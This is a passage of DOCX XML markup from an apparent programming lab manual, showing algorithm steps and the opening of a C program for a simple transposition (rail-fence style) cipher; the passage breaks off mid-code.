    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="400" w:right="313" w:hanging="300"/>
      </w:pPr>
      <w:r>
        <w:t>6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="46"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Af</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n a[] array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are cop</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ed,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>copy each</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>charac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b[] array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>[] array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndex.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7.  Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>[] array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</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ude&lt;s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ude&lt;s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>,k=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>=0,n,coun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>char s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r[20],s[20],a[10],b[10];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>AIN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TE</w:t>
      </w:r>
      <w:r>
        <w:t>XT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160" w:right="2116"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>^\</w:t>
      </w:r>
      <w:r>
        <w:t>n]s",s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">r);  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he scanned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160" w:right="5648"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>espa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>e re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng for (i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= 0;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f (s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">] != ' </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="820"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>[cou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t+</w:t>
      </w:r>
      <w:r>
        <w:t>+] = s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160" w:right="7326"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ranspos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(s); for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>%2==0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>a[k]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>s[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="257"/>
        <w:jc w:val="right"/>
      </w:pP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right="257"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>b[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>s[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
